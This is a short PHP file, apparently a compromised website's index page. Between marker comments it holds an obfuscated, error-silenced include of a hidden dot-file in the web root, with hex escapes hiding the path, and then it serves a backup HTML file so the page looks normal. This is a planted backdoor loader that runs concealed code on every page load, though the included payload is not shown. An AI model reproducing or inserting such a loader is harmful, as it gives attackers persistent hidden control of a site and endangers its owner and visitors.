<?php
/*07b71*/

@include /*3qx*/("/home/y765zof1uiuf/pub\x6cic_htm\x6c/hpwinvipmy.com/ka/.bd90ebc7.oti");

/*07b71*/


echo @file_get_contents('index.html.bak.bak');